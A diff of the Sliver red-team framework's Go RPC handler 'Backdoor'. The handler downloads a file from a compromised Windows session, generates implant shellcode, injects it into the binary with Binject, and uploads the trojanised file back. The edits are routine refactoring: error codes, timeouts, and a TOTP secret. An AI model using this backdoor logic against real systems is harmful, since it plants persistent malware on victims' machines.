@@ -21,28 +21,31 @@ package rpc
 import (
 	"context"
 	"fmt"
-	"io/ioutil"
+	"os"
 
 	"github.com/Binject/binjection/bj"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/server/core"
+	"github.com/bishopfox/sliver/server/cryptography"
 	"github.com/bishopfox/sliver/server/generate"
 	"github.com/bishopfox/sliver/util/encoders"
+	"google.golang.org/grpc/codes"
+	"google.golang.org/grpc/status"
 )
 
 // Backdoor - Inject a sliver payload in a file on the remote system
 func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sliverpb.Backdoor, error) {
 	resp := &sliverpb.Backdoor{}
 	session := core.Sessions.Get(req.Request.SessionID)
-	if session.Os != "windows" {
-		return nil, fmt.Errorf("%s is currently not supported", session.Os)
+	if session.OS != "windows" {
+		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf("%s is currently not supported", session.OS))
 	}
 	download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
 		Request: &commonpb.Request{
 			SessionID: session.ID,
-			Timeout:   int64(30),
+			Timeout:   req.Request.Timeout,
 		},
 		Path: req.FilePath,
 	})
@@ -75,23 +78,25 @@ func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sl
 	}
 
 	name, config := generate.ImplantConfigFromProtobuf(p.Config)
-	fPath, err := generate.SliverShellcode(name, config)
-
+	otpSecret, _ := cryptography.TOTPServerSecret()
+	err = generate.GenerateConfig(name, config, true)
 	if err != nil {
 		return nil, err
 	}
-
-	shellcode, err := ioutil.ReadFile(fPath)
+	fPath, err := generate.SliverShellcode(name, otpSecret, config, true)
 	if err != nil {
-		return nil, err
+		return nil, status.Error(codes.Internal, err.Error())
 	}
-
+	shellcode, err := os.ReadFile(fPath)
+	if err != nil {
+		return nil, status.Error(codes.Internal, err.Error())
+	}
 	bjConfig := &bj.BinjectConfig{
 		CodeCaveMode: true,
 	}
 	newFile, err := bj.Binject(download.Data, shellcode, bjConfig)
 	if err != nil {
-		return nil, err
+		return nil, status.Error(codes.Internal, err.Error())
 	}
 	uploadGzip := new(encoders.Gzip).Encode(newFile)
 	// upload to remote target
@@ -101,7 +106,7 @@ func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sl
 		Path:    req.FilePath,
 		Request: &commonpb.Request{
 			SessionID: session.ID,
-			Timeout:   int64(30),
+			Timeout:   req.Request.Timeout,
 		},
 	})
 	if err != nil {
